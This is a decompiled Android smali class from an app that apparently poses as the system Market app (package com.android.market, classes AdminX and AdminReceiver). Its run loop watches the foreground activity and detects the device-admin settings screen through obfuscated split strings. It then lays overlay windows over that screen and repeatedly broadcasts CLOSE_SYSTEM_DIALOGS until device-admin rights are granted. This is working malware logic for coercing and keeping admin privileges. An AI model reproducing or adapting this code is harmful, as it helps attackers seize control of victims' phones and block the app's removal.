.class Lcom/android/market/g;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/android/market/f;

.field private final synthetic b:Landroid/view/WindowManager;

.field private final synthetic c:Landroid/view/View;

.field private final synthetic d:Landroid/os/Handler;

.field private final synthetic e:Landroid/widget/TextView;

.field private final synthetic f:Landroid/view/WindowManager$LayoutParams;

.field private final synthetic g:Landroid/view/LayoutInflater;

.field private final synthetic h:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method constructor <init>(Lcom/android/market/f;Landroid/view/WindowManager;Landroid/view/View;Landroid/os/Handler;Landroid/widget/TextView;Landroid/view/WindowManager$LayoutParams;Landroid/view/LayoutInflater;Landroid/view/WindowManager$LayoutParams;)V
    .locals 0

    iput-object p1, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    iput-object p2, p0, Lcom/android/market/g;->b:Landroid/view/WindowManager;

    iput-object p3, p0, Lcom/android/market/g;->c:Landroid/view/View;

    iput-object p4, p0, Lcom/android/market/g;->d:Landroid/os/Handler;

    iput-object p5, p0, Lcom/android/market/g;->e:Landroid/widget/TextView;

    iput-object p6, p0, Lcom/android/market/g;->f:Landroid/view/WindowManager$LayoutParams;

    iput-object p7, p0, Lcom/android/market/g;->g:Landroid/view/LayoutInflater;

    iput-object p8, p0, Lcom/android/market/g;->h:Landroid/view/WindowManager$LayoutParams;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private a()Landroid/widget/Button;
    .locals 2

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    iget-object v0, v0, Lcom/android/market/e;->d:Landroid/view/View;

    const v1, 0x7f070006

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    return-object v0
.end method

.method private a(Landroid/view/View;)Landroid/widget/Button;
    .locals 1

    const v0, 0x7f070007

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    return-object v0
.end method

.method static synthetic a(Lcom/android/market/g;)Lcom/android/market/f;
    .locals 1

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    return-object v0
.end method

.method private a(Landroid/widget/Button;)V
    .locals 0

    return-void
.end method

.method private a(Landroid/widget/Button;Z)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/widget/Button;->setEnabled(Z)V

    return-void
.end method

.method private a(Landroid/widget/TextView;)V
    .locals 2

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    const v1, 0x7f050007

    invoke-virtual {v0, v1}, Lcom/android/market/AdminX;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    return-void
.end method

.method private b(Landroid/view/View;)Landroid/widget/TextView;
    .locals 1

    const v0, 0x7f070004

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    return-object v0
.end method

.method private b()V
    .locals 2

    iget-object v0, p0, Lcom/android/market/g;->e:Landroid/widget/TextView;

    const v1, 0x7f050008

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(I)V

    return-void
.end method

.method private c()V
    .locals 4

    iget-object v0, p0, Lcom/android/market/g;->b:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/android/market/g;->c:Landroid/view/View;

    iget-object v2, p0, Lcom/android/market/g;->f:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcom/android/market/g;->c:Landroid/view/View;

    invoke-direct {p0, v0}, Lcom/android/market/g;->a(Landroid/view/View;)Landroid/widget/Button;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setEnabled(Z)V

    new-instance v1, Lcom/android/market/h;

    iget-object v2, p0, Lcom/android/market/g;->e:Landroid/widget/TextView;

    iget-object v3, p0, Lcom/android/market/g;->c:Landroid/view/View;

    invoke-direct {v1, p0, v0, v2, v3}, Lcom/android/market/h;-><init>(Lcom/android/market/g;Landroid/widget/Button;Landroid/widget/TextView;Landroid/view/View;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method private d()Landroid/view/View;
    .locals 3

    iget-object v0, p0, Lcom/android/market/g;->g:Landroid/view/LayoutInflater;

    const v1, 0x7f030003

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v0

    return-object v0
.end method

.method private e()V
    .locals 3

    iget-object v0, p0, Lcom/android/market/g;->b:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v1}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v1

    iget-object v1, v1, Lcom/android/market/e;->d:Landroid/view/View;

    iget-object v2, p0, Lcom/android/market/g;->h:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    const/4 v10, 0x0

    const/4 v9, 0x1

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    invoke-virtual {v0, v9}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v10}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v1, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v3}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v3

    invoke-static {v3}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v3

    invoke-virtual {v3}, Lcom/android/market/AdminX;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/android/market/AdminReceiver;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    const-string v0, "Devi"

    const-string v3, "ceAdminAdd"

    invoke-virtual {v0, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "com"

    const-string v4, ".android.settings"

    invoke-virtual {v3, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/content/ComponentName;->getShortClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/AdminX;->c(Lcom/android/market/AdminX;)V

    :cond_0
    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v4

    iget-boolean v4, v4, Lcom/android/market/AdminX;->a:Z

    if-nez v4, :cond_2

    invoke-virtual {v1}, Landroid/content/ComponentName;->getShortClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v4

    iput-boolean v9, v4, Lcom/android/market/AdminX;->a:Z

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    iget-boolean v4, v4, Lcom/android/market/e;->e:Z

    if-nez v4, :cond_1

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    iget-boolean v4, v4, Lcom/android/market/e;->f:Z

    if-eqz v4, :cond_1

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    iget-object v4, v4, Lcom/android/market/e;->d:Landroid/view/View;

    invoke-direct {p0, v4}, Lcom/android/market/g;->b(Landroid/view/View;)Landroid/widget/TextView;

    move-result-object v4

    invoke-direct {p0, v4}, Lcom/android/market/g;->a(Landroid/widget/TextView;)V

    :cond_1
    :try_start_0
    invoke-direct {p0}, Lcom/android/market/g;->e()V

    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v4

    iget-object v5, p0, Lcom/android/market/g;->b:Landroid/view/WindowManager;

    iget-object v6, p0, Lcom/android/market/g;->c:Landroid/view/View;

    const/16 v7, 0x7d0

    const/4 v8, 0x0

    invoke-static {v4, v5, v6, v7, v8}, Lcom/android/market/AdminX;->a(Lcom/android/market/AdminX;Landroid/view/WindowManager;Landroid/view/View;IZ)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_2
    :goto_0
    iget-object v4, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v4}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v4

    invoke-static {v4}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v4

    iget-boolean v4, v4, Lcom/android/market/AdminX;->a:Z

    if-eqz v4, :cond_3

    invoke-virtual {v1}, Landroid/content/ComponentName;->getShortClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    iput-boolean v10, v0, Lcom/android/market/AdminX;->a:Z

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    const-string v4, "layout_inflater"

    invoke-virtual {v0, v4}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    invoke-direct {p0}, Lcom/android/market/g;->d()Landroid/view/View;

    move-result-object v0

    :try_start_1
    invoke-direct {p0}, Lcom/android/market/g;->c()V

    invoke-direct {p0}, Lcom/android/market/g;->b()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_1
    invoke-direct {p0, v0}, Lcom/android/market/g;->a(Landroid/view/View;)Landroid/widget/Button;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/android/market/g;->a(Landroid/widget/Button;)V

    invoke-virtual {v0, v9}, Landroid/widget/Button;->setEnabled(Z)V

    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/AdminX;->d(Lcom/android/market/AdminX;)V

    :cond_3
    if-nez v2, :cond_4

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.CLOSE_SYSTEM_DIALOGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v1}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v1

    invoke-static {v1}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/android/market/AdminX;->sendBroadcast(Landroid/content/Intent;)V

    iget-object v0, p0, Lcom/android/market/g;->d:Landroid/os/Handler;

    const-wide/16 v3, 0x64

    invoke-virtual {v0, p0, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_4
    if-eqz v2, :cond_6

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    iget-boolean v0, v0, Lcom/android/market/e;->f:Z

    if-eqz v0, :cond_5

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    iget-object v0, v0, Lcom/android/market/e;->d:Landroid/view/View;

    if-eqz v0, :cond_5

    invoke-direct {p0}, Lcom/android/market/g;->a()Landroid/widget/Button;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-direct {p0, v0, v10}, Lcom/android/market/g;->a(Landroid/widget/Button;Z)V

    :cond_5
    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    iget-object v1, p0, Lcom/android/market/g;->d:Landroid/os/Handler;

    iput-object v1, v0, Lcom/android/market/AdminX;->c:Landroid/os/Handler;

    iget-object v0, p0, Lcom/android/market/g;->d:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    iput-boolean v9, v0, Lcom/android/market/AdminX;->b:Z

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    iget-object v1, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v1}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v1

    iget-object v1, v1, Lcom/android/market/e;->a:Landroid/view/WindowManager;

    iget-object v2, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v2}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v2

    iget-object v2, v2, Lcom/android/market/e;->d:Landroid/view/View;

    const/16 v3, 0x3e8

    invoke-static {v0, v1, v2, v3, v9}, Lcom/android/market/AdminX;->a(Lcom/android/market/AdminX;Landroid/view/WindowManager;Landroid/view/View;IZ)V

    iget-object v0, p0, Lcom/android/market/g;->a:Lcom/android/market/f;

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    invoke-virtual {v0}, Lcom/android/market/AdminX;->stopSelf()V

    :cond_6
    return-void

    :catch_0
    move-exception v4

    goto/16 :goto_1

    :catch_1
    move-exception v4

    goto/16 :goto_0
.end method
